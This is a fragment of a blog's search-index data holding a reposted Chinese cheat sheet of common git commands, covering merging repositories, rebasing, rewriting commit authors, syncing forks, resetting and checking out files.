同时提交到 master 分支和 branch1 分支。 git checkout \u003cbranch-name\u003e \u0026\u0026 git cherry-pick \u003ccommit-id\u003e ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:17","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"获取最近一次提交的 commit id git rev-parse HEAD # e10721cb8859b2cd340d31a52ef4bf4b9629ddda git rev-parse --short HEAD # e10721c ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:18","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"两个 git 仓库合并 现在有两个仓库 kktjs/kkt 和 kktjs/kkt-next 我们需要将 kkt-next 仓库合并到 kkt 并保留 kkt-next 的所有提交内容。 # 1. 克隆主仓库代码 git clone git@github.com:kktjs/kkt.git # 2. 将 kkt-next 作为远程仓库，添加到 kkt 中，设置别名为 other git remote add other git@github.com:kktjs/kkt-next.git # 3. 从 kkt-next 仓库中拉取数据到本仓库 git fetch other # 4. 将 kkt-next 仓库拉取的 master 分支作为新分支 checkout 到本地，新分支名设定为 kkt-next git checkout -b kkt-next other/master # 5. 切换回 kkt 的 master 分支 git checkout master # 6. 将 kkt-next 合并入 kkt 的 master 分支 git merge kkt-next # 如果第 6 步报错 `fatal: refusing to merge unrelated histories` # 请执行下面命令 ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ git merge kkt-next --allow-unrelated-histories 在合并时有可能两个分支对同一个文件都做了修改，这时需要解决冲突，对文本文件来说很简单，根据需要对冲突的位置进行处理就可以。对于二进制文件，需要用到如下命令: git checkout --theirs YOUR_BINARY_FILES # 保留需要合并进来的分支的修改 git checkout --ours YOUR_BINARY_FILES # 保留自己的修改 git add YOUR_BINARY_FILES ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:19","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"合并多个commit # 这个命令，将最近4个commit合并为1个，HEAD代表当前版本。 # 将进入VIM界面，你可以修改提交信息。 git rebase -i HEAD~4 # 可以看到其中分为两个部分，上方未注释的部分是填写要执行的指令， # 而下方注释的部分则是指令的提示说明。指令部分中由前方的命令名称、commit hash 和 commit message 组成 # 当前我们只要知道 pick 和 squash 这两个命令即可。 # --\u003e pick 的意思是要会执行这个 commit # --\u003e squash 的意思是这个 commit 会被合并到前一个commit # 我们将 需要保留的 这个 commit 前方的命令改成 squash 或 s，然后输入:wq以保存并退出 # 这是我们会看到 commit message 的编辑界面 # 其中, 非注释部分就是两次的 commit message, 你要做的就是将这两个修改成新的 commit message。 # # 输入wq保存并推出, 再次输入git log查看 commit 历史信息，你会发现这两个 commit 已经合并了。 # 将修改强制推送到前端 git push -f origin master ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:20","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"修改远程Commit记录 git commit --amend # amend只能修改没有提交到线上的，最后一次commit记录 git rebase -i HEAD~3 # 表示要修改当前版本的倒数第三次状态 # 将要更改的记录行首单词 pick 改为 edit pick 96dc3f9 doc: Update quick-start.md pick f1cce8a test(Transition):Add transition test (#47) pick 6293516 feat(Divider): Add Divider component. # Rebase eeb03a4..6293516 onto eeb03a4 (3 commands) # # Commands: # p, pick = use commit # r, reword = use commit, but edit the commit message # e, edit = use commit, but stop for amending # s, squash = use commit, but meld into previous commit # f, fixup = like \"squash\", but discard this commit's log message # x, exec = run command (the rest of the line) using shell # d, drop = remove commit 保存并退出，会弹出下面提示 # You can amend the commit now, with # # git commit --amend # # Once you are satisfied with your changes, run # # git rebase --continue # 通过这条命令进入编辑页面更改commit，保存退出 git commit --amend # 保存退出确认修改，继续执行 rebase, git rebase --continue # 如果修改多条记录反复执行上面两条命令直到完成所有修改 # 最后，确保别人没有提交进行push，最好不要加 -f 强制推送 git push -f origin master ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:21","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"利用commit关闭一个issue 这个功能在Github上可以玩儿，Gitlab上特别老的版本不能玩儿哦，那么如何跟随着commit关闭一个issue呢? 在confirm merge的时候可以使用一下命令来关闭相关issue: fixes #xxx、 fixed #xxx、 fix #xxx、 closes #xxx、 close #xxx、 closed #xxx、 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:22","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"新建一个空分支 # 这种方式新建的分支(gh-pages)是没有 commit 记录的 git checkout --orphan gh-pages # 删除新建的gh-pages分支原本的内容，如果不删除，提交将作为当前分支的第一个commit git rm -rf . # 查看一下状态 有可能上面一条命令，没有删除还没有提交的的文件 git state ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:23","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"添加忽略文件 echo node_modules/ \u003e\u003e .gitignore ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:24","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"忽略某个文件的改动 git update-index --assume-unchanged path/to/file # 关闭 track 指定文件的改动，也就是 Git 将不会在记录这个文件的改动 git update-index --no-assume-unchanged path/to/file # 恢复 track 指定文件的改动 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:25","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"同步fork的上游仓库 Github教程同步fork教程，在Github上同步一个分支(fork) 设置添加多个远程仓库地址。 在同步之前，需要创建一个远程点指向上游仓库(repo).如果你已经派生了一个原始仓库，可以按照如下方法做。 $ git remote -v # List the current remotes （列出当前远程仓库） # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) $ git remote add upstream https://github.com/otheruser/repo.git # Set a new remote (设置一个新的远程仓库) $ git remote -v # Verify new remote (验证新的原唱仓库) # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) # upstream https://github.com/otheruser/repo.git (fetch) # upstream https://github.com/otheruser/repo.git (push) 同步更新仓库内容 同步上游仓库到你的仓库需要执行两步：首先你需要从远程拉去，之后你需要合并你希望的分支到你的本地副本分支。从上游的存储库中提取分支以及各自的提交内容。 master 将被存储在本地分支机构 upstream/master git fetch upstream # remote: Counting objects: 75, done. # remote: Compressing objects: 100% (53/53), done. # remote: Total 62 (delta 27), reused 44 (delta 9) # Unpacking objects: 100% (62/62), done. # From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY # * [new branch] master -\u003e upstream/master 检查你的 fork’s 本地 master 分支 git checkout master # Switched to branch 'master' 合并来自 upstream/master 的更改到本地 master 分支上。 这使你的前 fork’s master 分支与上游资源库同步，而不会丢失你本地修改。 git merge upstream/master # Updating a422352..5fdff0f # Fast-forward # README | 9 ------- # README.md | 7 ++++++ # 2 files changed, 7 insertions(+), 9 deletions(-) # delete mode 100644 README # create mode 100644 README.md ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:26","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"手动合并冲突的 Pull Request 以 tsbbjs/tsbb 为例，合并来自 jaywcjlove/tsbb master分支的 Pull Request。 # 1. 克隆主仓库 git clone git@github.com:tsbbjs/tsbb.git # 2. 在主仓库 master 分支切个 jaywcjlove-master 分支出来，并且切换到 jaywcjlove-master 分支 git checkout -b jaywcjlove-master master # 3. 获取 jaywcjlove/tsbb 仓库 master 分支最新代码 git pull https://github.com/jaywcjlove/tsbb.git master # ⚠️ 注意下面是输出内容： # ---------------------- # Auto-merging src/babel/transform.ts # CONFLICT (content): Merge conflict in src/babel/transform.ts # ---------------------- # ⚠️ 注意上面 CONFLICT 标识是有冲突无法自动合并的代码，根据路径进入代码手动合并 # 4. 合并完成之后，进行 commit 说明合并内容 git commit -m \"Merge branch 'master' of github.com:jaywcjlove/tsbb #3\" # 5. 切换到 master 分支，如果是 PR 其它分支，这里就切其它分支 git checkout master # 6. 合并 jaywcjlove-master 分支的代码 git merge --no-ff jaywcjlove-master # 7. 提交代码 git push origin master ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:27","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"修改作者名 git commit --amend --author='Author Name \u003cemail@address.com\u003e' ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:28","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"批量修改历史commit中的名字和邮箱 这是 Github官方教程 1.克隆仓库 注意参数，这个不是普通的clone，clone下来的仓库并不能参与开发 git clone --bare https://github.com/user/repo.git cd repo.git 2.命令行中运行代码 OLD_EMAIL原来的邮箱 CORRECT_NAME更正的名字 CORRECT_EMAIL更正的邮箱 将下面代码复制放到命令行中执行 git filter-branch -f --env-filter ' OLD_EMAIL=\"wowohoo@qq.com\" CORRECT_NAME=\"小弟调调\" CORRECT_EMAIL=\"更正的邮箱@qq.com\" if [ \"$GIT_COMMITTER_EMAIL\" = \"$OLD_EMAIL\" ] then export GIT_COMMITTER_NAME=\"$CORRECT_NAME\" export GIT_COMMITTER_EMAIL=\"$CORRECT_EMAIL\" fi if [ \"$GIT_AUTHOR_EMAIL\" = \"$OLD_EMAIL\" ] then export GIT_AUTHOR_NAME=\"$CORRECT_NAME\" export GIT_AUTHOR_EMAIL=\"$CORRECT_EMAIL\" fi ' --tag-name-filter cat -- --branches --tags 执行过程 Rewrite 160d4df2689ff6df3820563bfd13b5f1fb9ba832 (479/508) (16 seconds passed, remaining 0 predicted) Ref 'refs/heads/dev' was rewritten Ref 'refs/heads/master' was rewritten 3.同步到远程仓库 同步到push远程git仓库 git push --force --tags origin 'refs/heads/*' 我还遇到了如下面错误，lab默认给master分支加了保护，不允许强制覆盖。Project(项目)-\u003eSetting-\u003eRepository 菜单下面的Protected branches把master的保护去掉就可以了。修改完之后，建议把master的保护再加回来，毕竟强推不是件好事。 remote: GitLab: You are not allowed to force push code to a protected branch on this project. 当上面的push 不上去的时候，先 git pull 确保最新代码 git pull --allow-unrelated-histories # 或者指定分枝 git pull origin master --allow-unrelated-histories 4. 删除仓库 cd .. rm -rf repo.git ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:29","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"查看两个星期内的改动 git whatchanged --since='2 weeks ago' ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:30","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"查看某个文件历史 git log --pretty=oneline 文件名 # 列出文件的所有改动历史 git show c178bf49 # 某次的改动的修改记录 git log -p c178bf49 # 某次的改动的修改记录 git blame 文件名 # 显示文件的每一行是在那个版本最后修改。 git whatchanged 文件名 # 显示某个文件的每个版本提交信息：提交日期，提交人员，版本号，提交备注（没有修改细节） ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:31","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"查看git仓库中最近修改的分支 git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format='%(refname:short)' ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:32","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"更新所有本地分支 git branch \\ --format \"%(if)%(upstream:short)%(then)git push . %(upstream:short):%(refname:short)%(end)\" | sh ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:33","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"打造自己的git命令 git config --global alias.st status git config --global alias.br branch git config --global alias.co checkout git config --global alias.ci commit 配置好后再输入git命令的时候就不用再输入一大段了，例如我们要查看状态，只需： git st ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:34","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"删除已经合并到 master 的分支 git branch --merged master | grep -v '^\\*\\| master' | xargs -n 1 git branch -d ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:35","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"中文乱码的解决方案 git config --global core.quotepath false ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:36","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"提交一个空文件夹 在空文件夹中建立一个文件 .gitkeep, 你就可以提交这个空文件夹了。 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:37","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"新建仓库 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"init git init #初始化 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"status git status #获取状态 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:2","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"add git add file # .或*代表全部添加 git rm --cached \u003cadded_file_to_undo\u003e # 在commit之前撤销git add操作 git reset head # 好像比上面git rm --cached更方便 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:3","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"commit git commit -m \"message\" #此处注意乱码 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:4","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"remote git remote add origin git@github.com:JSLite/test.git #添加源 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:5","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"push git push -u origin master # push同事设置默认跟踪分支 git push origin master git push -f origin master # 强制推送文件，缩写 -f（全写--force） ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:4:6","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"clone git clone git://github.com/JSLite/JSLite.js.git git clone git://github.com/JSLite/JSLite.js.git --depth=1 git clone git://github.com/JSLite/JSLite.js.git mypro # 克隆到自定义文件夹 git clone [user@]example.com:path/to/repo.git/ # SSH协议还有另一种写法。 git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。git clone \u003c版本库的网址\u003e \u003c本地目录名\u003e $ git clone http[s]://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone git://example.com/path/to/repo.git/ $ git clone /opt/git/project.git $ git clone file:///opt/git/project.git $ git clone ftp[s]://example.com/path/to/repo.git/ $ git clone rsync://example.com/path/to/repo.git/ ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:5:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"本地 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"help git help config # 获取帮助信息 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"add git add * # 跟踪新文件 git add -u [path] # 添加[指定路径下]已跟踪文件 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:2","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"rm rm *\u0026git rm * # 移除文件 git rm -f * # 移除文件 git rm --cached * # 取消跟踪 git mv file_from file_to # 重命名跟踪文件 git log # 查看提交记录 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:3","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"commit git commit #提交更新 git commit -m 'message' #提交说明 git commit -a #跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交 git commit --amend #修改最后一次提交 git commit log #查看所有提交，包括没有push的commit git commit -m \"#133\" #关联issue 任意位置带上# 符号加上issue号码 git commit -m \"fix #133\" commit关闭issue git commit -m '概要描述'$'\\n\\n''1.详细描述'$'\\n''2.详细描述' #提交简要描述和详细描述 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:4","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"reset git reset HEAD * # 取消已经暂存的文件 git reset --mixed HEAD * # 同上 git reset --soft HEAD * # 重置到指定状态，不会修改索引区和工作树 git reset --hard HEAD * # 重置到指定状态，会修改索引区和工作树 git reset -- files * # 重置index区文件 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:5","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"revert git revert HEAD # 撤销前一次操作 git revert HEAD~ # 撤销前前一次操作 git revert commit # 撤销指定操作 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:6","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"checkout git checkout -- file # 取消对文件的修改（从暂存区——覆盖worktree file） git checkout branch|tag|commit -- file_name # 从仓库取出file覆盖当前分支 git checkout HEAD~1 [文件] # 将会更新 working directory 去匹配某次 commit git checkout -- . # 从暂存区取出文件覆盖工作区 git checkout -b gh-pages 0c304c9 # 这个表示 从当前分支 commit 哈希值为 0c304c9 